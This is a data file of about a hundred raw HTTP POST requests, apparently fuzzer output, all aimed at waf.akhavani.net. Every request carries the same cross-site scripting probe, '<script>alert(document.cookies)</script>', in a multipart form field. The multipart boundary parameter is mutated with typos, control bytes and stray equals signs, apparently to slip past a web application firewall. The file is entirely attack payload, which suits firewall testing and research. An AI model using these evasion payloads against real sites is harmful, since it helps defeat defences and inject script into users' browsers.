POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 915\r\nContent-Type: multipart/form-data; boundarjy==boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 979\r\nContent-Type: multipart/form-data; byou\xc2\xbbdaryboundry;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 9\r\nContent-Type: multipart/form-data; boundarybo\x17na60r;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 73\r\nContent-Type: multipart/form-data; 5oundary=bou\x0eday;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 137\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 201\r\nContent-Type: multipart/form-data; boundary=oundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 265\r\nContent-Type: multipart/form-data; =bouarBy=;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 329\r\nContent-Type: multipart/form-data; =bou\x0endary=boundry;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 393\r\nContent-Type: multipart/form-data; bou\x19da\x12yo\x06ndary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 457\r\nContent-Type: multipart/form-data; bondar^=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 521\r\nContent-Type: multipart/form-data; boundary==boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 585\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 649\r\nContent-Type: multipart/form-data; .outnbary=boun\x04dary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 713\r\nContent-Type: multipart/form-data; boundary=boundary!oundar;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 777\r\nContent-Type: multipart/form-data; voundIry=boundaLy;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 841\r\nContent-Type: multipart/form-data; boundarboundarboundarybunda\x06ry;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 905\r\nContent-Type: multipart/form-data; bund%arybounday;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 969\r\nContent-Type: multipart/form-data; boun}dayboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 6\r\nContent-Type: multipart/form-data; b\x18ouT\xc2\xbbn*daryboundaryboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 70\r\nContent-Type: multipart/form-data; boundar\x11y=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 134\r\nContent-Type: multipart/form-data; bouLdaryb$ounudaryondaru;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 198\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 262\r\nContent-Type: multipart/form-data; YboHundary=bound.\x15r\x11y;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 326\r\nContent-Type: multipart/form-data; boundar=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 390\r\nContent-Type: multipart/form-data; bou\x12arybzundaryoundr;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 454\r\nContent-Type: multipart/form-data; =boundPXary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 518\r\nContent-Type: multipart/form-data; b,undar\x02y=boundaryboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 582\r\nContent-Type: multipart/form-data; boundary=bondary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 646\r\nContent-Type: multipart/form-data; bu`nd)r=bo u[nDry;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 710\r\nContent-Type: multipart/form-data; boknZdary=bou8ay;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 774\r\nContent-Type: multipart/form-data; bo\x1cundaly=;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 838\r\nContent-Type: multipart/form-data; boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 902\r\nContent-Type: multipart/form-data; boundLry=bondaryboundar\x08;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 966\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 31\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 95\r\nContent-Type: multipart/form-data; b^undar\'bo\x17undLry;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 159\r\nContent-Type: multipart/form-data; bounUdarybouQd%r=oundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 223\r\nContent-Type: multipart/form-data; boundaly=;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 287\r\nContent-Type: multipart/form-data; =;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 351\r\nContent-Type: multipart/form-data; bou=darboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 415\r\nContent-Type: multipart/form-data; oundary=;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 479\r\nContent-Type: multipart/form-data; ====;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 543\r\nContent-Type: multipart/form-data; =boun2ry==;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 607\r\nContent-Type: multipart/form-data; =boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 671\r\nContent-Type: multipart/form-data; 8oundar\r;==bouda\x14y;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 735\r\nContent-Type: multipart/form-data; ;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 799\r\nContent-Type: multipart/form-data; oundary==;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 863\r\nContent-Type: multipart/form-data; boudaey\x05oundarmy;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 927\r\nContent-Type: multipart/form-data; =bouna{ry%oundarybou\'ndary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 991\r\nContent-Type: multipart/form-data; boun!ary=boundaryboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 38\r\nContent-Type: multipart/form-data; boundary\x12ound:ary=;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 102\r\nContent-Type: multipart/form-data; boundary=boFnda%y;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 166\r\nContent-Type: multipart/form-data; boundary==;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 230\r\nContent-Type: multipart/form-data; Tboundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 294\r\nContent-Type: multipart/form-data; bounda2y=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 358\r\nContent-Type: multipart/form-data; boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 422\r\nContent-Type: multipart/form-data; =undaruy=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 486\r\nContent-Type: multipart/form-data; boundary=boundar\';\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 550\r\nContent-Type: multipart/form-data; ==;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 614\r\nContent-Type: multipart/form-data; bondary=boundryboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 678\r\nContent-Type: multipart/form-data; oundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 742\r\nContent-Type: multipart/form-data; undar\x1ay7boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 806\r\nContent-Type: multipart/form-data; ==;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 870\r\nContent-Type: multipart/form-data; bouLnd%y=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 934\r\nContent-Type: multipart/form-data; ====;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 998\r\nContent-Type: multipart/form-data; boundar\x17y==;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 0\r\nContent-Type: multipart/form-data; bu@da&r=bo\'unary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 64\r\nContent-Type: multipart/form-data; bounarybnouYndary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 128\r\nContent-Type: multipart/form-data; bo=n\x08ary=;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 192\r\nContent-Type: multipart/form-data; =boun?ary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 256\r\nContent-Type: multipart/form-data; bou~\x06dagy_ounry;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 320\r\nContent-Type: multipart/form-data; bou n9dary=bouGdarE;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 384\r\nContent-Type: multipart/form-data; ounaryboudaHr8yboxunday\x1f;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 448\r\nContent-Type: multipart/form-data; boundarybjoundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 512\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 576\r\nContent-Type: multipart/form-data; bundYrj;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 640\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 704\r\nContent-Type: multipart/form-data; =bojnd\x14ar\x03y;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 768\r\nContent-Type: multipart/form-data; bouzdary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 832\r\nContent-Type: multipart/form-data; \x13ondary=.bou\rsu\nday;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 896\r\nContent-Type: multipart/form-data; bfoundary=eboundry;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 960\r\nContent-Type: multipart/form-data; bYundaar{boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 47\r\nContent-Type: multipart/form-data; boundaryboundaryueoundarybou\x1edary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 111\r\nContent-Type: multipart/form-data; bounda5y===;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 175\r\nContent-Type: multipart/form-data; =#ound\xc2\xabryboundMry=;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 239\r\nContent-Type: multipart/form-data; =boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 303\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 367\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 431\r\nContent-Type: multipart/form-data; bound\x0bryboudary=bQundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 495\r\nContent-Type: multipart/form-data; =$oundryboudary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 559\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 623\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 687\r\nContent-Type: multipart/form-data; bounda_rVy==bound\rry;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 751\r\nContent-Type: multipart/form-data; noun\x10arybou$dary===\x11boundUary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 815\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
